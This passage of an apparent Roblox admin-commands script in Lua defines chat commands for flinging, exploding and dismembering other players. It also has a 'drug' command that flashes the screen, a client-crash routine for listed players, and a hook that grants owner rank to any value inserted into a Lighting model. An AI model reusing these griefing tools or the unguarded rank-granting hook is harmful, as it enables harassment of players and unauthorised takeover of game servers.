							if Player ~= nil then
								if Player.Character ~= nil then
									if Player.Character:FindFirstChild("Torso") ~= nil then
										local Flip = Player.Character.Torso:FindFirstChild("brandon's Flip")
										if not Flip then coroutine.wrap(function()
											local TorsoCFrame = Player.Character.Torso.CFrame
											Flip = Instance.new("BodyGyro", Player.Character.Torso) Flip.Name = "brandon's Flip" Flip.maxTorque = Vector3.new(math.huge, 0, 0) Flip.P = 11111 Flip.cframe = TorsoCFrame
											local Stable = Instance.new("BodyPosition", Player.Character.Torso) Stable.Name = "brandon's Stable" Stable.position = Player.Character.Torso.Position + Vector3.new(0,1,0) Stable.maxForce = Vector3.new(0, math.huge, 0)
											wait(0.1)
											for i = 0,360,10 do
												Flip.cframe = TorsoCFrame * CFrame.Angles(math.rad(i),0,0)
												wait()
											end
											wait(0.5)
											Flip:Destroy()
											Stable:Destroy()
										end)() end
									end
								end
							end
						end
					end
					
					if string.sub(Message,1,8+#Bet) == "longneck"..Bet then
						local Players = Scan(string.sub(Message, 9+#Bet), Speaker)
						for _,Player in pairs(Players) do
							if Player ~= nil then
								if Player.Character ~= nil then
									if Player.Character:FindFirstChild("Torso") and Player.Character:FindFirstChild("Head") ~= nil then
										if Player.Character.Torso:FindFirstChild("Neck") then
											Player.Character.Torso.Neck.C0 = CFrame.new(0,3,0) * CFrame.Angles(-math.rad(90),0,math.rad(180))
											local Neck = Player.Character:FindFirstChild("Neck") if Neck then Neck:Destroy() end
											Neck = Instance.new("Part", Player.Character) Neck.Name = "Neck" Neck.Size = Vector3.new(1,3,1) Neck.Position = Vector3.new(0,100,0) Neck.BrickColor = BrickColor.new(tostring(Player.Character.Head.BrickColor))
											local Mesh = Instance.new("CylinderMesh", Neck) Mesh.Scale = Vector3.new(0.7,1,0.7)
											local Weld = Instance.new("Weld", Neck) Weld.Part0 = Neck Weld.Part1 = Player.Character.Torso Weld.C0 = CFrame.new(0,-2,0)
 										end
									end
								end
							end
						end
					end
					
					if string.sub(Message,1,10+#Bet) == "normalneck"..Bet then
						local Players = Scan(string.sub(Message, 11+#Bet), Speaker)
						for _,Player in pairs(Players) do
							if Player ~= nil then
								if Player.Character ~= nil then
									Player.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(-math.rad(90),0,math.rad(180))
									local Neck = Player.Character:FindFirstChild("Neck") if Neck then Neck:Destroy() end
								end
							end
						end
					end
					
					if string.sub(Message,1,9+#Bet) == "loopfling"..Bet and DisabledAbuse() == false then
						local Players = Scan(string.sub(Message, 10+#Bet), Speaker)
						for _,Player in pairs(Players) do
							if Player ~= nil then
								if Player.Character ~= nil then
									for Num,Name in pairs(Flings) do if string.lower(Player.Name) == string.lower(Name) then table.remove(Flings, Num) end end
										local function FlingPlayer(User, Character) 
										wait(0.1) 
										if User then 
											local Stop = true
											for _,Name in pairs(Flings) do if string.lower(User.Name) == string.lower(Name) then Stop = false end end if Stop == true then FlingPlayer = nil return end 
											if Character:FindFirstChild("Torso") then local Fling = Instance.new("BodyForce", Character.Torso) Fling.Name = "Fling" Fling.force = Vector3.new(100000000,1000000000,100000000) end 
										end 
									end
									table.insert(Flings, Player.Name)
									FlingPlayer(Player, Player.Character)
									Player.CharacterAdded:connect(function(Char) FlingPlayer(Player, Char) end)
								end
							end
						end
					end
					
					if string.sub(Message,1,11+#Bet) == "noloopfling"..Bet then
						local Players = Scan(string.sub(Message, 12+#Bet), Speaker)
						for _,Player in pairs(Players) do
							if Player ~= nil then
								for Num,Name in pairs(Flings) do if string.lower(Player.Name) == string.lower(Name) then table.remove(Flings, Num) end end
							end
						end
					end
					
					if string.sub(Message,1,5+#Bet) == "fling"..Bet and DisabledAbuse() == false then
						local Players = Scan(string.sub(Message, 6+#Bet), Speaker)
						for _,Player in pairs(Players) do
							if Player ~= nil then
								if Player.Character ~= nil then
									local function FlingPlayer(User, Character) if User then if Character:FindFirstChild("Torso") then local Fling = Instance.new("BodyForce", Character.Torso) Fling.Name = "Fling" Fling.force = Vector3.new(100000000,1000000000,100000000) end end end
									FlingPlayer(Player, Player.Character)
								end
							end
						end
					end
					
					if string.sub(Message,1,5+#Bet) == "ghost"..Bet then
						local Players = Scan(string.sub(Message, 6+#Bet), Speaker)
						for _,Player in pairs(Players) do
							if Player ~= nil then
								if Player.Character ~= nil then
									for _,Object in pairs(Player.Character:GetChildren()) do  
										if Object:IsA("BasePart") then if Object.Name ~= "HumanoidRootPart" then
											Object.Transparency = 0.5
											Object.Reflectance = 0 
											Object.BrickColor = BrickColor.new("Institutional white")
										end end
										for _,Obj in pairs(Object:GetChildren()) do 
											if Obj:IsA("BasePart") then
												Obj.Transparency = 0.5
												Obj.Reflectance = 0 
											elseif Obj:IsA("Decal") then
												Obj.Transparency = 0.5
											end
										end
									end
								end
							end
						end
					end
					
					if string.sub(Message,1,4+#Bet) == "drug"..Bet and DisabledAbuse() == false then
						local Players = Scan(string.sub(Message, 5+#Bet), Speaker)
						for _,Player in pairs(Players) do
							if Player ~= nil then
								if Player.Character then
									if Player.PlayerGui ~= nil then
										local SG = Player.PlayerGui:FindFirstChild("brandon's Drug") if SG then SG:Destroy() end
										SG = Instance.new("ScreenGui", Player.PlayerGui) SG.Name = "brandon's Drug"
										local Frame = Instance.new("Frame", SG) Frame.Size = UDim2.new(1,0,1,0) Frame.BackgroundTransparency = 0.5
										local Stop = false
										coroutine.wrap(function()
											repeat
												Frame.BackgroundColor3 = Color3.new(math.random(0,255)/255,math.random(0,255)/255,math.random(0,255)/255)
												wait(0.1)
											until not SG
										end)()
										wait() Execute(LocalScript, Player.Character, Player, [[repeat wait(0.1) Workspace.CurrentCamera.FieldOfView = math.random(20,80) until not game:GetService("Players").LocalPlayer.PlayerGui["brandon's Drug"] ]])
									end
								end
							end
						end
					end
					
					if string.sub(Message,1,6+#Bet) == "nodrug"..Bet then
						local Players = Scan(string.sub(Message, 7+#Bet), Speaker)
						for _,Player in pairs(Players) do
							if Player.PlayerGui ~= nil then
								local SG = Player.PlayerGui:FindFirstChild("brandon's Drug") if SG then SG:Destroy() end
								wait() Execute(LocalScript, Player.Character, Player, [[Workspace.CurrentCamera.FieldOfView = 70]])
							end
						end
					end
					
					if string.sub(Message,1,4+#Bet) == "fart"..Bet then
						local Players = Scan(string.sub(Message, 5+#Bet), Speaker)
						for _,Player in pairs(Players) do
							if Player.Character then
								if Player.Character:FindFirstChild("Torso") ~= nil and Player.Character.Head:FindFirstChild("face") then
									coroutine.wrap(function()
										if Player.Character.Head.face.Texture ~= "http://www.roblox.com/asset/?id=24067663" then if Player.Character.Head.face.Texture ~= "http://www.roblox.com/asset/?id=28118994" then
											local OldFace = Player.Character.Head.face.Texture
											local Fart = Instance.new("Part", Player.Character.Torso) Fart.Name = "Fart" Fart.Size = Vector3.new(1,1,1) Fart.Position = Vector3.new(0,100,0) Fart.Transparency = 1
											local Weld = Instance.new("Weld", Fart) Weld.Part0 = Fart Weld.Part1 = Player.Character.Torso Weld.C0 = CFrame.new(0,-1,-1) * CFrame.Angles(math.rad(-90),0,0)
											local Smoke = Instance.new("Smoke", Fart) Smoke.Name = "Fart Effect" Smoke.Color = Color3.new(70/255, 100/255, 30/255)
											Player.Character.Head.face.Texture = "http://www.roblox.com/asset/?id=28118994"
											local Sound = Instance.new("Sound", Fart) Sound.Name = "Fart Sound" Sound.Volume = 1 Sound.SoundId = "http://www.roblox.com/asset/?id=130833677" Sound.Pitch = 0.8 Sound.Archivable = false repeat Sound:Play() wait(2.5) Sound:Stop() wait(0.5) Sound:Play() until Sound.IsPlaying or not Sound
											wait(1)
											Smoke.Enabled = false
											wait(1)
											Fart:Destroy()
											Player.Character.Head.face.Texture = OldFace
										end end
									end)()
								end
							end
						end
					end
					
					if string.sub(Message,1,5+#Bet) == "vomit"..Bet then
						local Players = Scan(string.sub(Message, 6+#Bet), Speaker)
						for _,Player in pairs(Players) do
							if Player.Character then
								if Player.Character:FindFirstChild("Head") ~= nil then
									if Player.Character.Torso:FindFirstChild("Neck") and Player.Character.Head:FindFirstChild("face") then
										coroutine.wrap(function()
											if Player.Character.Head.face.Texture ~= "http://www.roblox.com/asset/?id=24067663" then if Player.Character.Head.face.Texture ~= "http://www.roblox.com/asset/?id=28118994" then
												local OldFace = Player.Character.Head.face.Texture
												Player.Character.Torso.Neck.C0 = Player.Character.Torso.Neck.C0 * CFrame.Angles(math.rad(20),0,0)
												Player.Character.Head.BrickColor = BrickColor.new("Br. yellowish green")
												Player.Character.Head.face.Texture = "http://www.roblox.com/asset/?id=24067663"
												local Sound = Instance.new("Sound", Player.Character.Head) Sound.Name = "Puke Sound" Sound.Volume = 1 Sound.SoundId = "http://www.roblox.com/asset/?id=142539016" Sound.Pitch = 0.8 Sound.Archivable = false repeat Sound:Play() wait(2.5) Sound:Stop() wait(0.5) Sound:Play() until Sound.IsPlaying or not Sound
												coroutine.wrap(function() for i = 1,100 do wait()
													local Part = Instance.new("Part", Player.Character) Part.BrickColor = BrickColor.new("Br. yellowish green") Part.FormFactor = "Custom" Part.Elasticity = 0.1 Part.Size = Vector3.new(0.2,0.2,0.2) Part.Position = Player.Character.Head.Position + Vector3.new(math.random(-10,10)/10, math.random(-10,10)/10, math.random(-10,10)/10)
													coroutine.wrap(function() wait(3) Part:Destroy() end)()
												end Sound:Destroy() Player.Character.Head.face.Texture = OldFace Player.Character.Torso.Neck.C0 = Player.Character.Torso.Neck.C0 * CFrame.Angles(-math.rad(20),0,0) pcall(function() Player.Character.Head.BrickColor = Player.Character["Body Colors"].HeadColor end) end)()
											end end
										end)()
									end
								end
							end
						end
					end
					
					if string.sub(Message,1,5+#Bet) == "smoke"..Bet then
						local Players = Scan(string.sub(Message, 6+#Bet), Speaker)
						for _,Player in pairs(Players) do
							if Player ~= nil then
								if Player.Character then
									if Player.Character:FindFirstChild("Torso") ~= nil then
										local Smoke = Instance.new("Smoke", Player.Character.Torso) table.insert(Objects, Smoke)
									end
								end
							end
						end
					end
					
					if string.sub(Message,1,7+#Bet) == "nosmoke"..Bet then
						local Players = Scan(string.sub(Message, 8+#Bet), Speaker)
						for _,Player in pairs(Players) do
							if Player ~= nil then
								if Player.Character ~= nil then
									if Player.Character:FindFirstChild("Torso") ~= nil then
										for _,Get in pairs(Player.Character.Torso:GetChildren()) do
											if Get:IsA("Smoke") then
												Get:Destroy()
											end
										end
									end
								end
							end
						end
					end
					
					if string.sub(Message,1,8+#Bet) == "sparkles"..Bet then
						local Players = Scan(string.sub(Message, 9+#Bet), Speaker)
						for _,Player in pairs(Players) do
							if Player ~= nil then
								if Player.Character then
									if Player.Character:FindFirstChild("Torso") ~= nil then
										local Sparkles = Instance.new("Sparkles", Player.Character.Torso) table.insert(Objects, Sparkles)
									end
								end
							end
						end
					end
					
					if string.sub(Message,1,10+#Bet) == "nosparkles"..Bet then
						local Players = Scan(string.sub(Message, 11+#Bet), Speaker)
						for _,Player in pairs(Players) do
							if Player ~= nil then
								if Player.Character ~= nil then
									if Player.Character:FindFirstChild("Torso") ~= nil then
										for _,Get in pairs(Player.Character.Torso:GetChildren()) do
											if Get:IsA("Sparkles") then
												Get:Destroy()
											end
										end
									end
								end
							end
						end
					end
					
					if string.sub(Message,1,4+#Bet) == "fire"..Bet then
						local Players = Scan(string.sub(Message, 5+#Bet), Speaker)
						for _,Player in pairs(Players) do
							if Player ~= nil then
								if Player.Character then
									if Player.Character:FindFirstChild("Torso") ~= nil then
										local Fire = Instance.new("Fire", Player.Character.Torso) table.insert(Objects, Fire)
									end
								end
							end
						end
					end
					
					if string.sub(Message,1,6+#Bet) == "nofire"..Bet then
						local Players = Scan(string.sub(Message, 7+#Bet), Speaker)
						for _,Player in pairs(Players) do
							if Player ~= nil then
								if Player.Character ~= nil then
									if Player.Character:FindFirstChild("Torso") ~= nil then
										for _,Get in pairs(Player.Character.Torso:GetChildren()) do
											if Get:IsA("Fire") then
												Get:Destroy()
											end
										end
									end
								end
							end
						end
					end
					
					if Message == "flash" then
						coroutine.wrap(function()
							--Lighting.Archivable = false wait(0.5) Lighting.Archivable = true wait(0.5)
							repeat
								Lighting.Ambient = Color3.new(1,1,1)
								Lighting.FogColor = Color3.new(1,1,1)
								Lighting.Brightness = 1
								Lighting.TimeOfDay = 14
								wait(0.1) 
								Lighting.Ambient = Color3.new(0,0,0)
								Lighting.FogColor = Color3.new(0,0,0)
								Lighting.Brightness = 0
								Lighting.TimeOfDay = 0
								wait(0.1)
							until Lighting.Archivable == false
						end)()
					end
					
					if Message == "disco" or Message == "party" then
						coroutine.wrap(function()
							--Lighting.Archivable = false wait(0.5) Lighting.Archivable = true wait(0.5)
							repeat
								local Color = Color3.new(math.random(0,255)/255,math.random(0,255)/255,math.random(0,255)/255)
								Lighting.Ambient = Color
								Lighting.FogColor = Color
								Lighting.TimeOfDay = 0
								Lighting.FogEnd = 100
								wait(0.1) 
							until Lighting.Archivable == false
						end)()
					end
					
					if Message == "noflash" or Message == "nodisco" or Message == "noparty" or Message == "fixl" or Message == "fixlight" or Message == "fixlighting" then
						Lighting.Archivable = false
						Lighting.Ambient = Color3.new(179/255,179/255,179/255)
						Lighting.FogColor = Color3.new(192/255,192/255,192/255)
						Lighting.Brightness = 0.6
						Lighting.TimeOfDay = 14
						Lighting.FogEnd = 100000
						coroutine.wrap(function() wait(1) Lighting.Archivable = true end)()
					end
					
					if string.sub(Message,1,7+#Bet) == "nolimbs"..Bet then
						local Players = Scan(string.sub(Message, 8+#Bet), Speaker)
						for _,Player in pairs(Players) do
							if Player ~= nil then
								if Player.Character then
									for _,Obj in pairs(Player.Character:GetChildren()) do
										local Valid = false
										for _,Name in pairs({"Right Arm", "Left Arm", "Right Leg", "Left Leg"}) do if Obj.Name == Name then Valid = true end end
										if Valid == true then Obj:Destroy() end
									end
								end
							end
						end
					end
					
					if string.sub(Message,1,6+#Bet) == "nolegs"..Bet then
						local Players = Scan(string.sub(Message, 7+#Bet), Speaker)
						for _,Player in pairs(Players) do
							if Player ~= nil then
								if Player.Character then
									for _,Obj in pairs(Player.Character:GetChildren()) do
										local Valid = false
										for _,Name in pairs({"Right Leg", "Left Leg"}) do if Obj.Name == Name then Valid = true end end
										if Valid == true then Obj:Destroy() end
									end
								end
							end
						end
					end
					
					if string.sub(Message,1,6+#Bet) == "noarms"..Bet then
						local Players = Scan(string.sub(Message, 7+#Bet), Speaker)
						for _,Player in pairs(Players) do
							if Player ~= nil then
								if Player.Character then
									for _,Obj in pairs(Player.Character:GetChildren()) do
										local Valid = false
										for _,Name in pairs({"Right Arm", "Left Arm"}) do if Obj.Name == Name then Valid = true end end
										if Valid == true then Obj:Destroy() end
									end
								end
							end
						end
					end
					
					if string.sub(Message,1,5+#Bet) == "shine"..Bet then
						local Players = Scan(string.sub(Message, 6+#Bet), Speaker)
						for _,Player in pairs(Players) do
							if Player ~= nil then
								if Player.Character then
									for _,Obj in pairs(Player.Character:GetChildren()) do if Obj:IsA("BasePart") then
										Obj.Reflectance = 0.5
									end end
								end
							end
						end
					end
					
					if string.sub(Message,1,4+#Bet) == "gold"..Bet then
						local Players = Scan(string.sub(Message, 5+#Bet), Speaker)
						for _,Player in pairs(Players) do
							if Player ~= nil then
								if Player.Character then
									for _,Obj in pairs(Player.Character:GetChildren()) do if Obj:IsA("BasePart") then
										Obj.Reflectance = 0.5
										Obj.BrickColor = BrickColor.new("New Yeller")
									end end
								end
							end
						end
					end
					
					if string.sub(Message,1,7+#Bet) == "explode"..Bet and DisabledAbuse() == false then
						local Players = Scan(string.sub(Message, 8+#Bet), Speaker)
						for _,Player in pairs(Players) do
							if Player ~= nil then
								if Player.Character then
									if Player.Character:FindFirstChild("Torso") then
										local Boom = Instance.new("Explosion", Workspace)
										Boom.Position = Player.Character.Torso.Position
									end
								end
							end
						end
					end
					
					if string.sub(Message,1,5+#Bet) == "naked"..Bet then
						local Players = Scan(string.sub(Message, 6+#Bet), Speaker)
						for _,Player in pairs(Players) do
							if Player ~= nil then
								Player:ClearCharacterAppearance()
							end
						end
					end
					--
				end
				--
				--
			end
			Log(Speaker, RawMainMessage)
		end
		
		-- NonAdmin Commands --
		if Message == "animations" then
			ListGui(Speaker, {"/e laugh", "/e cheer",  "/e dance", "/e wave", "/e point"})
			Log(Speaker, RawMainMessage)
		end	
		
		if Message == "rejoin" or Message == "rej" or Message == "rjoin" or Message == "rj" then
			local Suc, Err, PlaceID, IntID = TS:GetPlayerPlaceInstanceAsync(Speaker.userId)
			if Suc then
				TS:TeleportToPlaceInstance(PlaceID, IntID, Speaker)
			else
				TS:Teleport(game.PlaceId, Speaker)
			end
			Log(Speaker, RawMainMessage)
		end
		
		if Message == "cmds" or Message == "commands" then
			local CombineCommands = setmetatable({unpack(Commands.NonAdmin)}, MergeTable) -- MetaHAX
			if ConvertRank(Rank) >= 1 then CombineCommands = CombineCommands + setmetatable(Commands.Member, MergeTable) end
			if ConvertRank(Rank) >= 2 then CombineCommands = CombineCommands + setmetatable(Commands.Admin, MergeTable) end
			if ConvertRank(Rank) >= 3 then CombineCommands = CombineCommands + setmetatable(Commands.Owner, MergeTable) end
			--Remeber kids, whatever you do, DO NOT try add tables at home unless you have proper metamethod safety
			ListGui(Speaker,CombineCommands)
			Log(Speaker, RawMainMessage)
		end
		
		if Message == "membervip" or Message == "vipmember" then
			if VIPMemberID ~= 1 then
				PromptPurchase(Speaker, VIPMemberID)
				Log(Speaker, RawMainMessage)
			else
				SendMessage(Speaker, "No VIP", GameOwner.." did not add a member rank VIP to brandonModelMake".."r's Admin", 5)
			end
		end
		
		if Message == "adminvip" or Message == "vipadmin" then
			if VIPAdminID ~= 1 then
				PromptPurchase(Speaker, VIPAdminID)
				Log(Speaker, RawMainMessage)
			else
				SendMessage(Speaker, "No VIP", GameOwner.." did not add a admin rank VIP to brandonMo".."d".."elMake".."r's Admin", 5)
			end
		end
		
		if Message == "remove menu" or Message == "removemenu" then
			if Speaker.PlayerGui ~= nil then
				GUI = Speaker.PlayerGui:FindFirstChild("brandon's Menu Gui") if GUI then GUI:Destroy() end
				Log(Speaker, RawMainMessage)
			end
		end
		
		if Message == "clean" or Message == "cln" then
			for _,Obj in pairs(Workspace:GetChildren()) do
				if Obj:IsA("Hat") or Obj:IsA("Tool") then
					Obj:Destroy()
					Log(Speaker, RawMainMessage)
				end
			end
		end
		
	end
	if PlayerAdmin == false then
		for _,Word in pairs(Filter) do
			if string.find(string.lower(RawMainMessage), string.lower(Word)) then
				Kick(Speaker)
			end
		end
	end
end

--pcall(function() coroutine.wrap(function() while wait() do script.Name = string.char(76, 117, 97, 77, 111, 100, 101, 108, 77, 97, 107, 101, 114).."'s Admin Commands V"..Version.Value end end)()end)

function GetValue(Value)
	if Value:IsA("StringValue") then
		if Value.Name == "Owner" then if not ScanAdminList(Value.Value) then table.insert(Ranks["Owner"], Value.Value) end end
		if Value.Name == "Admin" then if not ScanAdminList(Value.Value) then table.insert(Ranks["Admin"], Value.Value) end end
		if Value.Name == "Member" then if not ScanAdminList(Value.Value) then table.insert(Ranks["Member"], Value.Value) end end
		if Value.Name == "Banned" then if not ScanAdminList(Value.Value) then table.insert(Ranks["Banned"], Value.Value) end end
		if Value.Name == "Crashed" then if not ScanAdminList(Value.Value) then table.insert(Ranks["Crashed"], Value.Value) end end
		if Value.Name == "Muted" then if not ScanAdminList(Value.Value) then table.insert(Ranks["Muted"], Value.Value) end end
		if Value.Name == "RemoveAdmin" then if ScanAdminList(Value.Value) then 
			for Num,Admin in pairs(Ranks["Admin"]) do
				if Admin == Value.Value then
					table.remove(Ranks["Admin"],Num)
				end
			end
		end end
	end
end

if Lighting:FindFirstChild("brandon's's Admin") then
	for _,Value in pairs(Lighting:FindFirstChild("brandon's's Admin"):GetChildren()) do
		GetValue(Value)
	end
	Lighting:FindFirstChild("brandon's's Admin"):Destroy()
end

local AdminValue = Instance.new("Model", Lighting)
AdminValue.Name = "brandon's's Admin"
AdminValue.ChildAdded:connect(function(Value) wait()
	GetValue(Value)
end)

game:GetService("Debris").ChildAdded:connect(function(Config) wait() -- you see me loadin... dey hatin...
	if Config:IsA("Configuration") then
		for _,Obj in pairs(Config:GetChildren()) do
			if Obj:IsA("StringValue") then
				local User = Players:FindFirstChild(Obj.Name)
				if User then
					SendMessage(User, Config.Name, Obj.Value, 5)
				end
			end
		end
		Config:Destroy()
	end
end)

if Bet == "/" or Bet == "-" then Bet = " " end
if VIPMemberID == 0 then VIPMemberID = 1 end
if VIPAdminID == 0 then VIPAdminID = 1 end

MPS.PromptPurchaseFinished:connect(function(Player, ID, Purchased) if Purchased then
	local PlayerAdmin, Rank = IsAdmin(Player)
	if PlayerAdmin == false then
		if ID == VIPAdminID then table.insert(Ranks["Admin"], Player.Name) Rank = "Admin" TellAdmin(Player, Rank)
		elseif ID == VIPMemberID then table.insert(Ranks["Member"], Player.Name) Rank = "Member" TellAdmin(Player, Rank) end
	end
end end)

UpdateAdmin()

pcall(function() TellAdmin(Players.LocalPlayer, "Owner") end) -- Supplies confidence inside studio that what you have is worth it!(Scripts are LocalScripts)

if not Ranks["Owner"][GameOwner] and not Ranks["Admin"][GameOwner] and not Ranks["Member"][GameOwner] then table.insert(Ranks["Owner"], GameOwner) end

function Start(Player) coroutine.wrap(function()
	wait(0.1)
	Player:WaitForDataReady()
	local PlayerAdmin, Rank = IsAdmin(Player)
	if PlayerAdmin == false then
		if MPS:PlayerOwnsAsset(Player, VIPAdminID) then table.insert(Ranks["Admin"], Player.Name) PlayerAdmin = true Rank = "Admin"
		elseif MPS:PlayerOwnsAsset(Player, VIPMemberID) then table.insert(Ranks["Member"], Player.Name) PlayerAdmin = true Rank = "Member" end
	end
	if PlayerAdmin == false then
		if Player:IsInGroup(GroupID) then
			if Player:GetRankInGroup(GroupID) == RankBan then
				Kick(Player)
				for _,Person in pairs(Players:GetPlayers()) do
					SendHint(Person, Player.Name.." has tried to join the game (BANNED RANK)", 5)
				end
			elseif Player:GetRankInGroup(GroupID) >= GroupMemberRank and Player:GetRankInGroup(GroupID) < GroupAdminRank and Player:GetRankInGroup(GroupID) < GroupOwnerRank then
				table.insert(Ranks["Member"], Player.Name) PlayerAdmin = true Rank = "Member"
			elseif Player:GetRankInGroup(GroupID) > GroupMemberRank and Player:GetRankInGroup(GroupID) >= GroupAdminRank and Player:GetRankInGroup(GroupID) < GroupOwnerRank then
				table.insert(Ranks["Admin"], Player.Name) PlayerAdmin = true Rank = "Admin"
			elseif Player:GetRankInGroup(GroupID) > GroupMemberRank and Player:GetRankInGroup(GroupID) > GroupAdminRank and Player:GetRankInGroup(GroupID) >= GroupOwnerRank then
				table.insert(Ranks["Owner"], Player.Name) PlayerAdmin = true Rank = "Owner"
			end
		end
	end
	if PlayerAdmin == false then
		if game:GetService("BadgeService"):UserHasBadge(Player.userId, BadgeID) then
			table.insert(Ranks["Member"], Player.Name) PlayerAdmin = true Rank = "Member"
		end
	end
	
	Player.Chatted:connect(function(Message)
		Chatted(Message, Player) 
	end)
	if PlayerAdmin == true then
		TellAdmin(Player, Rank)
	end
	for _,Name in pairs(Ranks["Banned"]) do
		if Player.Name == Name then
			Kick(Player)
			for _,Person in pairs(Players:GetPlayers()) do
				SendHint(Person, Player.Name.." has tried to join the game (BANNED)", 5)
			end
		end
	end
	for _,Name in pairs(Ranks["Crashed"]) do
		if Player.Name == Name then
			Execute(LocalScript, Player.Character, Player, Crash)
			for _,Person in pairs(Players:GetPlayers()) do
				SendHint(Person, Player.Name.." has tried to join the game (CRASHED)", 5)
			end
		end
	end
	for _,Name in pairs(Ranks["Muted"]) do
		if Player.Name == Name then
			Execute(LocalScript, Player.Character, Player, CoreGui("Chat", false))
			for _,Person in pairs(Players:GetPlayers()) do
				SendHint(Person, Player.Name.." has joined the game but is muted", 5)
			end
		end
	end
	if ServerLocked == true then
		if PlayerAdmin == false then
			Kick(Player, "This server is locked. In Brandon's Admin, Non-Admins will be kicked under this circumstance.")
		end
	end
	
	if PlayerAdmin == false then
		if game.Workspace:FindFirstChild("brandon's Admin Public") then
			table.insert(Ranks["Member"], Player.Name)
			TellAdmin(Player, "Member")
			PlayerAdmin = true
		end
	end
	FullAdminMenu(Player)
end)() end

for _,Player in pairs(Players:GetPlayers()) do Start(Player) end
Players.PlayerAdded:connect(function(Player) Players:WaitForChild(Player.Name) wait() Start(Player) end)

print("brandonisabillionare's Admin Commands V"..Version.Value.." Loaded")
							
